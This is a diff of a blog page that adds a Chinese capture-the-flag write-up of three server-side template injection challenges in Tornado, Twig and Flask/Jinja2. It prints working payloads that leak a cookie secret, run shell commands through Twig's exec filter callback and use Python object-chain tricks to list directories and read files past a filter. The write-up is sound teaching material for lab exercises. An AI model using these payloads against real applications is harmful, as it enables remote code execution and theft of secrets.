@@ -6,20 +6,41 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>running till the sun goes down | Gm_blog</title>
+  <title>（wp）ctfweb-buu中ssti模板注入 | Gm_blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="welcome to my blog！ 查文章请看目录或搜索tag 请点击   -&gt;展开全文   阅读">
+  <meta name="description" content="学习文章在前一篇">
 <meta property="og:type" content="article">
-<meta property="og:title" content="running till the sun goes down">
-<meta property="og:url" content="http://example.com/2021/06/16/running%20till%20the%20sun%20goes%20down/index.html">
+<meta property="og:title" content="（wp）ctfweb-buu中ssti模板注入">
+<meta property="og:url" content="http://example.com/2021/06/28/(wp)ctfweb-buu%E4%B8%ADssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/index.html">
 <meta property="og:site_name" content="Gm_blog">
-<meta property="og:description" content="welcome to my blog！ 查文章请看目录或搜索tag 请点击   -&gt;展开全文   阅读">
+<meta property="og:description" content="学习文章在前一篇">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2021-06-16T08:45:29.595Z">
-<meta property="article:modified_time" content="2021-06-27T11:49:02.469Z">
+<meta property="og:image" content="https://i.loli.net/2021/06/28/JpSrnqcu9QzgRk1.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/28/GUD9pRAlmoFywSE.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/28/7girIkdaASC4O1x.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/28/dZghu8sTqkKbjzC.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/28/Q3sXjMgDWcJ6C5P.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/28/qdHivX4ErBChAVl.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/28/JmMcOqjIdl3gPoz.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/28/nIfBHhM9GJyP4qo.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/28/YGEbvcOZQahAgXN.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/28/d4uegtnoZ23Mixs.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/28/PQh4XlbSKHNEROI.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/28/fHLoWiB8U1sbYk3.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/28/SjmhFaxnIwDeRfQ.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/28/UHkAdws5ZrXfgQb.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/28/FkX7dReBKsACnqS.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/28/y8W4mGaiohPDg3J.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/28/aEpY5PSDMlKTwHf.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/28/W8zvhqFBGKiSnP5.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/28/mVvwtf8ODhnukRW.png">
+<meta property="og:image" content="https://i.loli.net/2021/06/28/QqiFUklB1j2MESu.png">
+<meta property="article:published_time" content="2021-06-28T12:51:13.874Z">
+<meta property="article:modified_time" content="2021-07-08T14:40:14.728Z">
 <meta property="article:author" content="gaomeng">
-<meta property="article:tag" content="yeah">
+<meta property="article:tag" content="SSTI">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/06/28/JpSrnqcu9QzgRk1.png">
   
     <link rel="alternative" href="/atom.xml" title="Gm_blog" type="application/atom+xml">
   
@@ -171,34 +192,116 @@
           </div>
           <div id="js-content" class="content-ll">
             
-    <i class="fa fa-thumb-tack"></i>
-    <font color=7D26CD>置顶</font>
-    <span class="post-meta-divider">|</span>
-  
-<article id="post-running till the sun goes down" class="article article-type-post " itemscope itemprop="blogPost">
+<article id="post-(wp)ctfweb-buu中ssti模板注入" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      running till the sun goes down
+      （wp）ctfweb-buu中ssti模板注入
     </h1>
   
 
         
-        <a href="/2021/06/16/running%20till%20the%20sun%20goes%20down/" class="archive-article-date">
-  	<time datetime="2021-06-16T08:45:29.595Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-16</time>
+        <a href="/2021/06/28/(wp)ctfweb-buu%E4%B8%ADssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" class="archive-article-date">
+  	<time datetime="2021-06-28T12:51:13.874Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-28</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>welcome to my blog！</p>
-<p>查文章请看目录或搜索tag</p>
-<p>请点击   -&gt;展开全文   阅读</p>
-<hr>
+        <p>学习文章在前一篇</p>
+<span id="more"></span>
+
+
+
+<h1 id="一、-护网杯-2018-easy-tornado"><a href="#一、-护网杯-2018-easy-tornado" class="headerlink" title="一、[护网杯 2018]easy_tornado"></a>一、[护网杯 2018]easy_tornado</h1><p>打开题目，只有三个链接，如图，</p>
+<img src="https://i.loli.net/2021/06/28/JpSrnqcu9QzgRk1.png" alt="1.1.png" style="zoom: 33%;">
+
+<p>依次点开</p>
+<p><img src="https://i.loli.net/2021/06/28/GUD9pRAlmoFywSE.png" alt="1.2.png"></p>
+<p><img src="https://i.loli.net/2021/06/28/7girIkdaASC4O1x.png" alt="1.3.png"></p>
+<p><img src="https://i.loli.net/2021/06/28/dZghu8sTqkKbjzC.png" alt="1.4.png"></p>
+<p>根据每个网址的链接和flag页面的内容可以推测，flag应该是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=/fllllllllllllag&amp;filehash=md5(cookie_secret+md5(filename))</span><br></pre></td></tr></table></figure>
+
+<p>这种格式。</p>
+<p>所以本题的关键在 cookie_secret</p>
+<p>根据第二个链接内容，百度render可以发现，render()是tornado里的函数，可以生成html模板。</p>
+<p>我们对网站进行尝试注入，看是否有注入点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filename=/fllllllllllllag&amp;filehash=&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/06/28/Q3sXjMgDWcJ6C5P.png" alt="1.5.png"></p>
+<p>发现网页报错，但明显还能尝试注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">error?msg=&#123;&#123;7*7&#125;&#125;    和        error?msg=&#123;&#123;7&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>发现当输入7*7时，返回orz；输入7时，返回7</p>
+<p>说明可以注入，但*可能被过滤</p>
+<p>因为存在注入点，所以我们需要寻找cookie_secret路径</p>
+<p>百度发现，其存在位置为handler.settings</p>
+<p><img src="https://i.loli.net/2021/06/28/qdHivX4ErBChAVl.png" alt="1.6.png"></p>
+<p>进行注入得</p>
+<p><img src="https://i.loli.net/2021/06/28/JmMcOqjIdl3gPoz.png" alt="1.7.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;cookie_secret&#x27;: &#x27;3b278e82-468b-487a-8cd2-bcf53c8a19d0&#x27;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为 md5(filename)=md5(/fllllllllllllag)=3bf9f6cf685a6dd8defadabfb41a03a1</p>
+<p>拼接后加密得 2bd5cf6fe358fa26518f4bca650e3a79</p>
+<p><img src="https://i.loli.net/2021/06/28/nIfBHhM9GJyP4qo.png" alt="1.8.png"></p>
+<p>最后输入payload进行查询，得到flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fllllllllllllag&amp;filehash=2bd5cf6fe358fa26518f4bca650e3a79</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/06/28/YGEbvcOZQahAgXN.png" alt="1.9.png"></p>
+<p>flag{5d8b767c-07af-46ff-831d-30e9c7f4d32b}</p>
+<h1 id="二、-BJDCTF2020-Cookie-is-so-stable"><a href="#二、-BJDCTF2020-Cookie-is-so-stable" class="headerlink" title="二、[BJDCTF2020]Cookie is so stable"></a>二、[BJDCTF2020]Cookie is so stable</h1><p>打开题目，需要输入id，随便输入后发现找不到flag</p>
+<p>尝试注入</p>
+<img src="https://i.loli.net/2021/06/28/d4uegtnoZ23Mixs.png" alt="2.1.png" style="zoom:50%;">
+
+<img src="https://i.loli.net/2021/06/28/PQh4XlbSKHNEROI.png" alt="2.2.png" style="zoom:50%;">
+
+<p>发现有明显的注入漏洞，又因为结构为49且基于php，可以推测出模板为twig。根据源码提示进行抓包，发现uesr是注入点</p>
+<img src="https://i.loli.net/2021/06/28/fHLoWiB8U1sbYk3.png" alt="2.3.png" style="zoom:50%;">
+
+<p>直接百度或根据上一篇文章的payload进行注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;cat /flag&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="https://i.loli.net/2021/06/28/SjmhFaxnIwDeRfQ.png" alt="2.4.png" style="zoom:50%;">
+
+<p>得flag{d7ef7d9d-6ba4-4dd5-88ec-33500d9b2ad3}</p>
+<h1 id="三、-GYCTF2020-FlaskApp"><a href="#三、-GYCTF2020-FlaskApp" class="headerlink" title="三、[GYCTF2020]FlaskApp"></a>三、[GYCTF2020]FlaskApp</h1><p>进去是这个页面，提示里没有信息</p>
+<img src="https://i.loli.net/2021/06/28/UHkAdws5ZrXfgQb.png" alt="3.1.png" style="zoom:50%;">
+
+<p>随便尝试后，发现加密中可以注入代码，解密就能得到值：</p>
+<p>注入14得e3s3Kzd9fQ== 翻译得14</p>
+<p>但再注入49时，加密得e3s3Kjd9fQ==</p>
+<p>再解密却得</p>
+<p><img src="https://i.loli.net/2021/06/28/FkX7dReBKsACnqS.png" alt="3.2.png"></p>
+<p>说明存在过滤</p>
+<p>尝试注入查找目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls /&#x27;).read()&quot;)&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/06/28/y8W4mGaiohPDg3J.png" alt="3.3.png"></p>
+<p>发现又被过滤了，于是考虑查看源码，在解密中随便输入进入debug：</p>
+<img src="https://i.loli.net/2021/06/28/aEpY5PSDMlKTwHf.png" alt="3.4.png" style="zoom:50%;">
+
+<p>可以发现，在输出结果时有过滤，存在于app.py的waf中，百度一下payload，尝试读取文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;app.py&#x27;, &#x27;r&#x27;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/06/28/W8zvhqFBGKiSnP5.png" alt="3.5.png"></p>
+<p>找到了被过滤的字符</p>
+<p>拼接os和import构造payload寻找目录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&#x27;&#x27;.__class__.__bases__[0].__subclasses__()[75].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;__imp&#x27;+&#x27;ort__&#x27;](&#x27;o&#x27;+&#x27;s&#x27;).listdir(&#x27;/&#x27;)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/06/28/mVvwtf8ODhnukRW.png" alt="3.6.png"></p>
+<p>然后拼接flag，读取文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].open(&#x27;/this_is_the_fl&#x27;+&#x27;ag.txt&#x27;,&#x27;r&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i.loli.net/2021/06/28/QqiFUklB1j2MESu.png" alt="3.7.png"></p>
+<p>得到flag{f8cc4e99-1ec3-49f2-b0be-b92686d4ff31}</p>
+<h1 id="四、部分payload总结，快速使用"><a href="#四、部分payload总结，快速使用" class="headerlink" title="四、部分payload总结，快速使用"></a>四、部分payload总结，快速使用</h1><p><a target="_blank" rel="noopener" href="https://2740908911.github.io/2021/06/28/buu%E4%B8%AD%E7%9A%84%E9%83%A8%E5%88%86ssti%E8%A7%A3%E9%A2%98%E8%BF%87%E7%A8%8B/">buu中的部分ssti解题过程</a></p>
+<p><a target="_blank" rel="noopener" href="https://xi4or0uji.github.io/2019/01/15/flask%E4%B9%8Bssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/#%E6%94%BB%E5%87%BB">flask之ssti模板注入</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_54515836/article/details/113778233">ssti详解与例题以及绕过payload大全</a></p>
 
       
 
@@ -237,18 +340,13 @@
     </div>
     <div class="article-info article-info-index">
       
-        <div class="article-pop-out tagcloud">
-          <i class="icon-tuding"></i>
-          <a class="article-tag-list-link color3">置顶</a>
-        </div>
-      
       
 	<div class="article-tag tagcloud">
 		<i class="icon-price-tags icon"></i>
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">yeah</a>
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">SSTI</a>
         		</li>
       		
 		</ul>
@@ -304,7 +402,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://2740908911.github.io/021/06/16/running%20till%20the%20sun%20goes%20down/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://2740908911.github.io/021/06/28/(wp)ctfweb-buu%E4%B8%ADssti%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -318,18 +416,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2021/06/20/(wp)ctfweb-sql%E6%B3%A8%E5%85%A5%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2021/06/29/python%E4%B8%AD%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86%E7%82%B9/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          （wp）ctfweb-sql注入极客大挑战
+          python学习中部分易忘知识点
         
       </div>
     </a>
   
   
-    <a href="/2021/06/16/(Test)%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8Bmarkdown%E8%AF%AD%E6%B3%95/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">（Test）markdown语法复习</div>
+    <a href="/2021/06/27/ctfweb-SSTI%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">ctfweb-SSTI服务器模板注入</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -356,7 +454,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    目录，不存在的…
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%80%E3%80%81-%E6%8A%A4%E7%BD%91%E6%9D%AF-2018-easy-tornado"><span class="toc-number">1.</span> <span class="toc-text">一、[护网杯 2018]easy_tornado</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BA%8C%E3%80%81-BJDCTF2020-Cookie-is-so-stable"><span class="toc-number">2.</span> <span class="toc-text">二、[BJDCTF2020]Cookie is so stable</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%89%E3%80%81-GYCTF2020-FlaskApp"><span class="toc-number">3.</span> <span class="toc-text">三、[GYCTF2020]FlaskApp</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E9%83%A8%E5%88%86payload%E6%80%BB%E7%BB%93%EF%BC%8C%E5%BF%AB%E9%80%9F%E4%BD%BF%E7%94%A8"><span class="toc-number">4.</span> <span class="toc-text">四、部分payload总结，快速使用</span></a></li></ol>
                     </div>
                 </span>
             </div>
@@ -372,7 +470,7 @@
   
 
   
-  <div id="SOHUCS" sid="running till the sun goes down" ></div> 
+  <div id="SOHUCS" sid="(wp)ctfweb-buu中ssti模板注入" ></div> 
 <script charset="utf-8" type="text/javascript" src="//changyan.sohu.com/upload/changyan.js" ></script>
 <script type="text/javascript">
     window.changyan.api.config({
